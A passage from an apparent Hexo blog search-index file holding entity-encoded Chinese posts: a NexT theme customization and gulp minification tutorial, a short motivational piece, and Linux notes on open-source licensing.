question.&#x8C28;&#x4EE5;&#x6B64;&#x53E5;&#x732E;&#x7ED9;&#x5728;&#x8FF7;&#x96FE;&#x4E2D;&#x7825;&#x783A;&#x524D;&#x884C;&#x7684;&#x6211;&#x4EEC; &#x540E;&#x7EED;&#x2026;&#x8C22;&#x8C22;&#x5927;&#x5BB6;&#x7684;&#x8D5E;&#x8FD9;&#x53E5;&#x8BDD;&#x4F1A;&#x6709;&#x79CD;&#x83AB;&#x540D;&#x7684;&#x60C5;&#x6000;&#xFF0C;&#x6709;&#x70B9;&#x5C0F;&#x6CBB;&#x6108;&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x52AA;&#x529B;&#x4E0D;&#x662F;&#x81EA;&#x6211;&#x611F;&#x52A8;&#x6700;&#x6015;&#x4F60;&#x4E00;&#x76F4;&#x5FD9;&#x5FD9;&#x788C;&#x788C;&#x5230;&#x5934;&#x6765;&#x8FD8;&#x5728;&#x4EBA;&#x6D77;&#x91CC;&#x6D6E;&#x6C89;&#x3002;&#x6709;&#x8DA3;&#x7684;&#x7075;&#x9B42;&#x548C;&#x52AA;&#x529B;&#x7684;&#x4F60;&#x90FD;&#x8981;&#x5728;&#x8DEF;&#x4E0A; &#x6765;&#x81EA;&#x77E5;&#x4E4E;&#x5F53;&#x4EE3;&#x5927;&#x5B66;&#x751F;&#x6709;&#x591A;&#x52AA;&#x529B;&#xFF1F;@&#x859B;&#x5B9A;&#x8C14;&#x7684; en document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"学习","slug":"学习","permalink":"https://marnm.github.io/tags/学习/"},{"name":"生活","slug":"生活","permalink":"https://marnm.github.io/tags/生活/"},{"name":"努力","slug":"努力","permalink":"https://marnm.github.io/tags/努力/"}]},{"title":"NexT主题优化+美化","date":"2018-07-27T12:16:41.000Z","path":"/posts/60444925/","text":"&#x524D;&#x8A00;&#x5173;&#x4E8E;Hexo&#x535A;&#x5BA2;NexT&#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x5C31;&#x4E0D;&#x4E00;&#x4E00;&#x5217;&#x4E3E;&#x7684;&#xFF0C;&#x7F51;&#x4E0A;&#x6559;&#x7A0B;&#x4E00;&#x5927;&#x5806;&#xFF0C;&#x6211;&#x5C31;&#x5217;&#x51FA;&#x4E00;&#x4E9B;&#x4E2A;&#x4EBA;&#x89C9;&#x5F97;&#x6BD4;&#x8F83;&#x5B9E;&#x7528;&#x7684; 1.0 &#x89C6;&#x89C9;&#x4F18;&#x5316;&#x4E0E;&#x6027;&#x80FD;&#x4F18;&#x5316; 1.1 &#x66F4;&#x6539;&#x5B57;&#x4F53; themes\\next\\source\\css\\\\_varibles\\custom.styl 1234567891011121314// &#x6807;&#x9898;&#xFF0C;&#x4FEE;&#x6539;&#x6210;&#x4F60;&#x671F;&#x671B;&#x7684;&#x5B57;&#x4F53;&#x65CF;$font-family-headings = Georgia, sans// &#x4FEE;&#x6539;&#x6210;&#x4F60;&#x671F;&#x671B;&#x7684;&#x5B57;&#x4F53;&#x65CF;$font-family-base = &quot;Microsoft YaHei&quot;, Verdana, sans-serif// &#x4EE3;&#x7801;&#x5B57;&#x4F53;$code-font-family = &quot;Input Mono&quot;, &quot;PT Mono&quot;, Consolas, Monaco, Menlo, monospace// &#x6B63;&#x6587;&#x5B57;&#x4F53;&#x7684;&#x5927;&#x5C0F;$font-size-base = 16px// &#x4EE3;&#x7801;&#x5B57;&#x4F53;&#x7684;&#x5927;&#x5C0F;$code-font-size = 13px 1.2 &#x4FEE;&#x6539;&#x884C;&#x8DDD;&#x548C;&#x95F4;&#x8DDD; themes\\next\\source\\css\\\\_varibles\\base.styl 123// &#x5168;&#x6587;&#x95F4;&#x8DDD;&#x53C2;&#x6570;$line-height-base = 1.8$line-height-code-block = 1.6 // Can&apos;t be less than 1.3 1.3 &#x4F7F;&#x7528;gulp&#x538B;&#x7F29;hexo&#x535A;&#x5BA2;&#x5B89;&#x88C5;gulp 1npm install gulp -g &#x5B89;&#x88C5;gulp&#x4F9D;&#x8D56;&#x6A21;&#x5757; gulp-htmlclean //&#x6E05;&#x7406;HTML gulp-htmlmin //&#x538B;&#x7F29;HTML gulp-minify //&#x538B;&#x7F29;CSS gulp-uglify //&#x6DF7;&#x6DC6;js gulp-imagemin //&#x538B;&#x7F29;&#x56FE;&#x7247; 1npm install gulp-htmlclean gulp-htmlmin gulp-minify-css gulp-uglify gulp-imagemin --save &#x5B89;&#x88C5;&#x5B8C;&#x53EF;&#x4EE5;&#x5728;&#x6839;&#x76EE;&#x5F55;package.json&#x6587;&#x4EF6;&#x91CC;&#x770B;&#x5230; 1234567891011121314&quot;dependencies&quot;: { &quot;gulp&quot;: &quot;^3.9.1&quot;, &quot;gulp-imagemin&quot;: &quot;^4.1.0&quot;, ... ... }, &quot;devDependencies&quot;: { &quot;babel-core&quot;: &quot;^6.26.3&quot;, &quot;gulp-babel&quot;: &quot;^7.0.1&quot;, &quot;gulp-htmlclean&quot;: &quot;^2.7.22&quot;, &quot;gulp-htmlmin&quot;: &quot;^4.0.0&quot;, &quot;gulp-minify-css&quot;: &quot;^1.2.4&quot;, &quot;gulp-uglify&quot;: &quot;^3.0.1&quot; } &#x5728;&#x535A;&#x5BA2;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#x624B;&#x52A8;&#x6DFB;&#x52A0;gulpfile.js&#x6587;&#x4EF6; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748var gulp = require(&apos;gulp&apos;);var minifycss = require(&apos;gulp-minify-css&apos;);var uglify = require(&apos;gulp-uglify&apos;);var htmlmin = require(&apos;gulp-htmlmin&apos;);var htmlclean = require(&apos;gulp-htmlclean&apos;);var imagemin = require(&apos;gulp-imagemin&apos;);// &#x538B;&#x7F29;htmlgulp.task(&apos;minify-html&apos;, function() { return gulp.src(&apos;./public/**/*.html&apos;) .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest(&apos;./public&apos;))});// &#x538B;&#x7F29;cssgulp.task(&apos;minify-css&apos;, function() { return gulp.src(&apos;./public/**/*.css&apos;) .pipe(minifycss({ compatibility: &apos;ie8&apos; })) .pipe(gulp.dest(&apos;./public&apos;));});// &#x538B;&#x7F29;jsgulp.task(&apos;minify-js&apos;, function() { return gulp.src(&apos;./public/js/**/*.js&apos;) .pipe(uglify()) .pipe(gulp.dest(&apos;./public&apos;));});// &#x538B;&#x7F29;&#x56FE;&#x7247;gulp.task(&apos;minify-images&apos;, function() { return gulp.src(&apos;./public/images/**/*.*&apos;) .pipe(imagemin( [imagemin.gifsicle({&apos;optimizationLevel&apos;: 3}), imagemin.jpegtran({&apos;progressive&apos;: true}), imagemin.optipng({&apos;optimizationLevel&apos;: 7}), imagemin.svgo()], {&apos;verbose&apos;: true})) .pipe(gulp.dest(&apos;./public/images&apos;))});// &#x9ED8;&#x8BA4;&#x4EFB;&#x52A1;gulp.task(&apos;default&apos;, [ &apos;minify-html&apos;,&apos;minify-css&apos;,&apos;minify-js&apos;,&apos;minify-images&apos;]); &#x76F4;&#x63A5;&#x8FD0;&#x884C;gulp&#x547D;&#x4EE4;&#x5F00;&#x59CB;&#x538B;&#x7F29; &#x53C2;&#x8003;&#x94FE;&#x63A5; Hexo&#x535A;&#x5BA2;&#x4E4B;&#x901F;&#x5EA6;&#x4F18;&#x5316; &#x4F18;&#x5316;Hexo&#x535A;&#x5BA2; - &#x538B;&#x7F29; HTML&#x3001;CSS&#x3001;JS&#x3001;IMG &#x7B49; hexo&#x535A;&#x5BA2;&#x8FDB;&#x9636; - &#x6027;&#x80FD;&#x4F18;&#x5316; 2.0 &#x4E3B;&#x9898;&#x7F8E;&#x5316;&#x4E0E;&#x4E3B;&#x9898;&#x4FEE;&#x6539;2.1 &#x4FEE;&#x6539;&#x5B57;&#x4F53;&#x989C;&#x8272;2.2 &#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F; theme\\next\\source\\css\\\\_common\\components\\post\\post.styl 123456789101112// &#x5728;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;// &#x6587;&#x7AE0;&#x5185;&#x94FE;&#x63A5;&#x6587;&#x672C;&#x6837;&#x5F0F;.post-body p a{ color: #0593d3; border-bottom: none; border-bottom: 1px solid #0593d3; &amp;:hover { color: #fc6423; border-bottom: none; border-bottom: 1px solid #fc6423; }} 2.3 &#x4FEE;&#x6539;&#x6587;&#x7AE0;&#x5E95;&#x90E8;&#x6807;&#x7B7E;&#x7684;#&#x53F7; /themes/next/layout/_macro/post.swig &#x641C;&#x7D22;rel=&quot;tag&quot;&#xFF0C;&#x5C06;#&#x6362;&#x6210;&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; 2.4 &#x5728;&#x6BCF;&#x7BC7;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0; &#x5728;\\themes\\next\\layout\\_macro&#x4E2D;&#x65B0;&#x5EFA;passage-end-tag.swig&#x6587;&#x4EF6; 12345&lt;div&gt; {% if not is_index %} &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------Ending-------------&lt;/div&gt; {% endif %}&lt;/div&gt; &#x63A5;&#x7740;&#x6253;&#x5F00;\\themes\\next\\layout\\_macro\\post.swig&#xFF0C;&#x5728;post-body&#x4E4B;&#x540E;&#x548C;post-footer&#x4E4B;&#x524D;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x4EE3;&#x7801; 12345&lt;div&gt; {% if not is_index %} {% include &apos;post-end-tag.swig&apos; %} {% endif %}&lt;/div&gt; &#x7136;&#x540E;&#x5728;&#x4E3B;&#x9898;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x672B;&#x5C3E;&#x6DFB;&#x52A0; 123# &#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x6DFB;&#x52A0;&#x201C;&#x672C;&#x6587;&#x7ED3;&#x675F;&#x201D;&#x6807;&#x8BB0;passage_end_tag: enabled: true 2.5 &#x4FEE;&#x6539;&#x4F5C;&#x8005;&#x5934;&#x50CF;&#x6837;&#x5F0F;&#x6253;&#x5F00;\\themes\\next\\source\\css\\_common\\components\\sidebar\\sidebar-author.styl 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354.site-author-image { display: block; margin: 0 auto; padding: $site-author-image-padding; max-width: $site-author-image-width; height: $site-author-image-height; border: $site-author-image-border-width solid $site-author-image-border-color; /* &#x5934;&#x50CF;&#x5706;&#x5F62; */ border-radius: 80px; -webkit-border-radius: 80px; -moz-border-radius: 80px; box-shadow: inset 0 -1px 0 #333sf; /* &#x8BBE;&#x7F6E;&#x5FAA;&#x73AF;&#x52A8;&#x753B; [animation: (play)&#x52A8;&#x753B;&#x540D;&#x79F0; (2s)&#x52A8;&#x753B;&#x64AD;&#x653E;&#x65F6;&#x957F;&#x5355;&#x4F4D;&#x79D2;&#x6216;&#x5FAE;&#x79D2; (ase-out)&#x52A8;&#x753B;&#x64AD;&#x653E;&#x7684;&#x901F;&#x5EA6;&#x66F2;&#x7EBF;&#x4E3A;&#x4EE5;&#x4F4E;&#x901F;&#x7ED3;&#x675F; (1s)&#x7B49;&#x5F85;1&#x79D2;&#x7136;&#x540E;&#x5F00;&#x59CB;&#x52A8;&#x753B; (1)&#x52A8;&#x753B;&#x64AD;&#x653E;&#x6B21;&#x6570;(infinite&#x4E3A;&#x5FAA;&#x73AF;&#x64AD;&#x653E;) ]*/ /* &#x9F20;&#x6807;&#x7ECF;&#x8FC7;&#x5934;&#x50CF;&#x65CB;&#x8F6C;360&#x5EA6; */ -webkit-transition: -webkit-transform 1.0s ease-out; -moz-transition: -moz-transform 1.0s ease-out; transition: transform 1.0s ease-out;}img:hover { /* &#x9F20;&#x6807;&#x7ECF;&#x8FC7;&#x505C;&#x6B62;&#x5934;&#x50CF;&#x65CB;&#x8F6C; -webkit-animation-play-state:paused; animation-play-state:paused;*/ /* &#x9F20;&#x6807;&#x7ECF;&#x8FC7;&#x5934;&#x50CF;&#x65CB;&#x8F6C;360&#x5EA6; */ -webkit-transform: rotateZ(360deg); -moz-transform: rotateZ(360deg); transform: rotateZ(360deg);}/* Z &#x8F74;&#x65CB;&#x8F6C;&#x52A8;&#x753B; */@-webkit-keyframes play { 0% { -webkit-transform: rotateZ(0deg); } 100% { -webkit-transform: rotateZ(-360deg); }}@-moz-keyframes play { 0% { -moz-transform: rotateZ(0deg); } 100% { -moz-transform: rotateZ(-360deg); }}@keyframes play { 0% { transform: rotateZ(0deg); } 100% { transform: rotateZ(-360deg); }} 2.6 &#x4FEE;&#x6539;&#x4EE3;&#x7801;&#x5757;&#x6837;&#x5F0F;\\themes\\next\\source\\css\\_custom\\custom.styl 12345678910111213141516&#x5411;&#x91CC;&#x9762;&#x52A0;&#x5165;&#xFF1A;(&#x989C;&#x8272;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x5B9A;&#x4E49;)// Custom styles.code { color: #ff7600; background: #fbf7f8; margin: 2px;}// &#x5927;&#x4EE3;&#x7801;&#x5757;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#x6837;&#x5F0F;.highlight, pre { margin: 5px 0; padding: 5px; border-radius: 3px;}.highlight, code, pre { border: 1px solid #d6d6d6;} 2.7 &#x53D6;&#x6D88;&#x4FA7;&#x8FB9;&#x680F;&#x6587;&#x7AE0;&#x76EE;&#x5F55;&#x5BF9;&#x6807;&#x9898;&#x7684;&#x81EA;&#x52A8;&#x7F16;&#x53F7;&#x6253;&#x5F00;&#x4E3B;&#x9898;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5C06;number:&#x53D8;&#x91CF;&#x6539;&#x6210;false&#x5373;&#x53EF; number: false 2.8 &#x4FEE;&#x6539;&#x4FA7;&#x8FB9;&#x680F;&#x7684;&#x80CC;&#x666F;&#x56FE;&#x7247;&amp;&#x989C;&#x8272;&#x4FA7;&#x8FB9;&#x680F;&#x6837;&#x5F0F;&#x6587;&#x4EF6;\\themes\\next\\source\\css\\_common\\components\\sidebar\\sidebar.styl 12345678.sidebar { position: fixed; right: 0; top: 0; bottom: 0; background: url(&#x56FE;&#x7247;&#x5730;&#x5740;.jpg) no-repeat !important; background-size: cover !important;} 2.9 &#x7ED9;&#x4FA7;&#x8FB9;&#x680F;&#x5934;&#x50CF;&#x6DFB;&#x52A0;&#x94FE;&#x63A5;&#x6253;&#x5F00;\\next\\source\\css\\_common\\components\\sidebar\\sidebar-author.styl&#xFF1B;&#x5728;.site-author-image&#x53D8;&#x91CF;&#x5185;&#x6DFB;&#x52A0;cursor: pointer;&#x4FEE;&#x6539;&#x9F20;&#x6807;&#x6837;&#x5F0F;&#xFF1B;&#x6253;&#x5F00;\\next\\source\\js\\src\\motion.js&#xFF0C;&#x5728;&#x9876;&#x90E8;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x4EE3;&#x7801;&#xFF1A; 123$(&apos;.site-author-image&apos;).click(function(){ window.location.href=&quot;&#x81EA;&#x5B9A;&#x4E49;&#x94FE;&#x63A5;&quot;;}); 3.0 &#x6DFB;&#x52A0;&#x52A0;&#x5BC6;&#x529F;&#x80FD; Hexo&#x7684;&#x6587;&#x7AE0;&#x52A0;&#x5BC6;&#x6211;&#x77E5;&#x9053;&#x7684;&#x6709;&#x4E24;&#x79CD;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x8BB2;hexo-blog-encrypt &#x7684;&#x4F7F;&#x7528;&#x4F60;&#x5199;&#x4E86;&#x4E00;&#x7BC7;&#x535A;&#x5BA2;&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x51FA;&#x4E8E;&#x67D0;&#x79CD;&#x539F;&#x56E0;&#xFF0C;&#x4E0D;&#x592A;&#x5E0C;&#x671B;&#x6BCF;&#x4E00;&#x4E2A;&#x4EBA;&#x90FD;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x3002;&#x6240;&#x4EE5;&#x4F60;&#x5E38;&#x5E38;&#x4F1A;&#x4E3A;&#x8FD9;&#x79CD;&#x6587;&#x7AE0;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x5BC6;&#x7801;&#xFF0C;&#x9700;&#x8981;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x624D;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x8FD9;&#x7BC7;&#x535A;&#x5BA2;&#x3002;&#x8BE6;&#x7EC6;&#x4ECB;&#x7ECD;&#x53C2;&#x8003;&#xFF1A;https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md 3.1 &#x5B89;&#x88C5; &#x5728;hexo&#x6839;&#x76EE;&#x5F55;&#x7684;package.json&#x6587;&#x4EF6;&#x4E2D;&#x7684;dependencies&#x6DFB;&#x52A0;&quot;hexo-blog-encrypt&quot;: &quot;1.1.*&quot;, &#x6CE8;&#x610F;&#xFF1A;&#x5C3D;&#x91CF;&#x6DFB;&#x52A0;&#x5728;&#x5F00;&#x5934;&#xFF0C;&#x4E0D;&#x8981;&#x52A0;&#x5728;&#x5E95;&#x90E8; &#x7136;&#x540E;&#x6267;&#x884C;npm install&#x547D;&#x4EE4; &#x8BE5;&#x63D2;&#x4EF6;&#x4F1A;&#x81EA;&#x52A8;&#x5B89;&#x88C5; 3.2 &#x5FEB;&#x901F;&#x5F00;&#x59CB; &#x9996;&#x5148;&#x5728;_config.yml&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x542F;&#x7528;&#x63D2;&#x4EF6; 1234# Security##encrypt: enable: true &#x7136;&#x540E;&#x5728;&#x4F60;&#x7684;&#x6587;&#x7AE0;&#x7684;&#x5934;&#x90E8;&#x4E0A;&#x52A0;&#x4E0A;&#x5BF9;&#x5E94;&#x5B57;&#x6BB5;&#xFF1A; 123456789---title: hello worlddate: 2016-03-30 21:18:02tags: - fdsafsdafpassword: 123456abstract: Welcome to my blog, enter password to read.message: Welcome to my blog, enter password to read.--- password: &#x662F;&#x8BE5;&#x535A;&#x5BA2;&#x52A0;&#x5BC6;&#x4F7F;&#x7528;&#x7684;&#x5BC6;&#x7801; abstract: &#x662F;&#x8BE5;&#x535A;&#x5BA2;&#x7684;&#x6458;&#x8981;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x5728;&#x535A;&#x5BA2;&#x7684;&#x5217;&#x8868;&#x9875; message: &#x8FD9;&#x4E2A;&#x662F;&#x535A;&#x5BA2;&#x67E5;&#x770B;&#x65F6;&#xFF0C;&#x5BC6;&#x7801;&#x8F93;&#x5165;&#x6846;&#x4E0A;&#x9762;&#x7684;&#x63CF;&#x8FF0;&#x6027;&#x6587;&#x5B57; &#x6700;&#x540E;&#x7ED9;&#x51FA;&#x4E00;&#x4E9B;&#x6574;&#x7406;&#x7684;&#x6BD4;&#x8F83;&#x597D;&#x7684;&#x6587;&#x7AE0;&#x4E3A;Hexo NexT&#x4E3B;&#x9898;&#x6DFB;&#x52A0;&#x54C8;&#x6797;&#x6447;&#x7279;&#x6548;hexo&#x7684;next&#x4E3B;&#x9898;&#x4E2A;&#x6027;&#x5316;&#x6559;&#x7A0B;&#xFF1A;&#x6253;&#x9020;&#x70AB;&#x9177;&#x7F51;&#x7AD9;| Moorez&#x6253;&#x9020;&#x4E2A;&#x6027;&#x8D85;&#x8D5E;&#x535A;&#x5BA2;Hexo+NexT+GitHubPagesHEXO+NEXT&#x4E3B;&#x9898;&#x4E2A;&#x6027;&#x5316;&#x914D;&#x7F6E;| SORA&#x5B98;&#x65B9;NexT &#x4F7F;&#x7528;&#x6587;&#x6863; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://marnm.github.io/tags/Hexo/"},{"name":"NexT","slug":"NexT","permalink":"https://marnm.github.io/tags/NexT/"}]},{"title":"Linux学习笔记 - 关于开源","date":"2018-07-10T12:55:02.000Z","path":"/posts/67ee4dec/","text":"1. &#x5F00;&#x6E90;&#x5171;&#x4EAB;&#x7CBE;&#x795E;&#x4F4E;&#x98CE;&#x9669;&#xFF1A;&#x4F7F;&#x7528;&#x95ED;&#x6E90;&#x8F6F;&#x4EF6;&#x65E0;&#x7591;&#x628A;&#x547D;&#x8FD0;&#x4EA4;&#x4ED8;&#x7ED9;&#x4ED6;&#x4EBA;&#xFF0C;&#x4E00;&#x65E6;&#x5C01;&#x95ED;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x6CA1;&#x6709;&#x4EBA;&#x6765;&#x7EF4;&#x62A4;&#xFF0C;&#x4F60;&#x5C06;&#x8FDB;&#x9000;&#x7EF4;&#x8C37;&#xFF1B;&#x800C;&#x4E14;&#x76F8;&#x8F83;&#x4E8E;&#x5546;&#x4E1A;&#x8F6F;&#x4EF6;&#x516C;&#x53F8;&#xFF0C;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x5F88;&#x5C11;&#x5B58;&#x5728;&#x5012;&#x95ED;&#x7684;&#x95EE;&#x9898;&#x3002; &#x9AD8;&#x54C1;&#x8D28;&#xFF1A;&#x76F8;&#x8F83;&#x4E8E;&#x95ED;&#x6E90;&#x8F6F;&#x4EF6;&#x4EA7;&#x54C1;&#xFF0C;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#x901A;&#x5E38;&#x662F;&#x7531;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x6765;&#x7814;&#x53D1;&#x53CA;&#x7EF4;&#x62A4;&#x7684;&#xFF0C;&#x53C2;&#x4E0E;&#x7F16;&#x5199;&#x3001;&#x7EF4;&#x62A4;&#x3001;&#x6D4B;&#x8BD5;&#x7684;&#x7528;&#x6237;&#x91CF;&#x4F17;&#x591A;&#xFF0C;&#x4E00;&#x822C;&#x7684;bug&#x8FD8;&#x6CA1;&#x6709;&#x7B49;&#x7206;&#x53D1;&#x5C31;&#x5DF2;&#x7ECF;&#x88AB;&#x4FEE;&#x8865;&#x3002; &#x4F4E;&#x6210;&#x672C;&#xFF1A;&#x5F00;&#x6E90;&#x5DE5;&#x4F5C;&#x8005;&#x90FD;&#x662F;&#x5728;&#x5E55;&#x540E;&#x9ED8;&#x9ED8;&#x4E14;&#x65E0;&#x507F;&#x5730;&#x4ED8;&#x51FA;&#x52B3;&#x52A8;&#x6210;&#x679C;&#xFF0C;&#x4E3A;&#x7F8E;&#x597D;&#x7684;&#x4E16;&#x754C;&#x8D21;&#x732E;&#x4E00;&#x4EFD;&#x529B;&#x91CF;&#xFF0C;&#x56E0;&#x6B64;&#x4F7F;&#x7528;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x63A8;&#x52A8;&#x7684;&#x8F6F;&#x4EF6;&#x9879;&#x76EE;&#x53EF;&#x4EE5;&#x8282;&#x7701;&#x5927;&#x91CF;&#x7684;&#x4EBA;&#x529B;&#x3001;&#x7269;&#x529B;&#x548C;&#x8D22;&#x529B;&#x3002; &#x66F4;&#x900F;&#x660E;&#xFF1A;&#x6CA1;&#x6709;&#x54EA;&#x4E2A;&#x7B28;&#x86CB;&#x4F1A;&#x628A;&#x6728;&#x9A6C;&#x3001;&#x540E;&#x95E8;&#x7B49;&#x653E;&#x5230;&#x5F00;&#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x8FD9;&#x6837;&#x65E0;&#x7591;&#x662F;&#x628A;&#x81EA;&#x5DF1;&#x7684;&#x7F6A;&#x884C;&#x66B4;&#x9732;&#x5728;&#x9633;&#x5149;&#x4E4B;&#x4E0B;&#x3002; &#x4F46;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x4E3A;&#x4E86;&#x5355;&#x7EAF;&#x8FFD;&#x6C42;&#x201C;&#x81EA;&#x7531;&#x201D;&#x800C;&#x727A;&#x7272;&#x7A0B;&#x5E8F;&#x5458;&#x7684;&#x5229;&#x76CA;&#xFF0C;&#x8FD9;&#x5C06;&#x4F1A;&#x5F71;&#x54CD;&#x7A0B;&#x5E8F;&#x5458;&#x7684;&#x521B;&#x9020;&#x6FC0;&#x60C5;&#xFF0C;&#x56E0;&#x6B64;&#x4E16;&#x754C;&#x4E0A;&#x73B0;&#x5728;&#x6709;60&#x591A;&#x79CD;&#x88AB;&#x5F00;&#x6E90;&#x4FC3;&#x8FDB;&#x7EC4;&#x7EC7;&#xFF08;Open Source Initiative&#xFF09;&#x8BA4;&#x53EF;&#x7684;&#x5F00;&#x6E90;&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x6765;&#x4FDD;&#x8BC1;&#x5DE5;&#x4F5C;&#x8005;&#x7684;&#x6743;&#x76CA;&#x3002;&#x5BF9;&#x4E8E;&#x90A3;&#x4E9B;&#x53EA;&#x77E5;&#x9053;&#x4E00;&#x5473;&#x6284;&#x88AD;&#x3001;&#x7BE1;&#x6539;&#x3001;&#x7834;&#x89E3;&#x6216;&#x8005;&#x76D7;&#x7248;&#x4ED6;&#x4EBA;&#x4F5C;&#x54C1;&#x7684;&#x4EBA;&#xFF0C;&#x7EC8;&#x5F52;&#x4F1A;&#x5728;&#x67D0;&#x4E00;&#x5929;&#x6536;&#x5230;&#x6CD5;&#x9662;&#x7684;&#x4F20;&#x7968;&#x3002; GNU GPL (GNU General Public License , GNU&#x901A;&#x7528;&#x516C;&#x5171;&#x8BB8;&#x53EF;&#x8BC1;)&#xFF1A;&#x53EA;&#x8981;&#x54E6;&#x8F6F;&#x4EF6;&#x4E2D;&#x5305;&#x542B;&#x4E86;&#x9075;&#x5FAA;GPL&#x534F;&#x8BAE;&#x7684;&#x4EA7;&#x54C1;&#x6216;&#x4EE3;&#x7801;&#xFF0C;&#x8BE5;&#x8F6F;&#x4EF6;&#x5C31;&#x5FC5;&#x987B;&#x9075;&#x5FAA;GPL&#x8BB8;&#x53EF;&#x534F;&#x8BAE;&#x4E14;&#x5F00;&#x6E90;&#x3001;&#x514D;&#x8D39;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x5E76;&#x4E0D;&#x9002;&#x5408;&#x5546;&#x7528;&#x8F6F;&#x4EF6;&#x3002;&#x9075;&#x5FAA;&#x8BE5;&#x534F;&#x8BAE;&#x7684;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x6570;&#x91CF;&#x53CA;&#x5176;&#x5E9E;&#x5927;&#xFF0C;&#x5305;&#x62EC;Linux&#x7CFB;&#x7EDF;&#x5728;&#x5185;&#x7684;&#x5927;&#x591A;&#x6570;&#x7684;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x90FD;&#x662F;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x7684;&#x3002; GNU &#x590D;&#x5236;&#x81EA;&#x7531;&#xFF1A;&#x5141;&#x8BB8;&#x5427;&#x8F6F;&#x4EF6;&#x590D;&#x5236;&#x5230;&#x4EFB;&#x4F55;&#x4EBA;&#x7684;&#x7535;&#x8111;&#x4E2D;&#xFF0C;&#x5E76;&#x4E14;&#x4E0D;&#x9650;&#x590D;&#x5236;&#x7684;&#x6570;&#x91CF; &#x4F20;&#x64AD;&#x81EA;&#x7531;&#xFF1A;&#x5141;&#x8BB8;&#x8F6F;&#x4EF6;&#x4EE5;&#x5404;&#x79CD;&#x5F62;&#x5F0F;&#x4F20;&#x64AD; &#x6536;&#x8D39;&#x4F20;&#x64AD;&#xFF1A;&#x5141;&#x8BB8;&#x5728;&#x5404;&#x79CD;&#x5A92;&#x4ECB;&#x4E0A;&#x51FA;&#x552E;&#x8BE5;&#x8F6F;&#x4EF6;&#xFF0C;&#x4F46;&#x5FC5;&#x987B;&#x63D0;&#x524D;&#x8BA9;&#x4E70;&#x5BB6;&#x77E5;&#x9053;&#x8FD9;&#x4E2A;&#x8F6F;&#x4EF6;&#x662F;&#x53EF;&#x4EE5;&#x514D;&#x8D39;&#x83B7;&#x5F97;&#x7684;&#xFF1B;&#x56E0;&#x6B64;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BB2;&#xFF0C;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x6709;&#x507F;&#x670D;&#x52A1;&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x76C8;&#x5229;&#x7684;&#x3002; 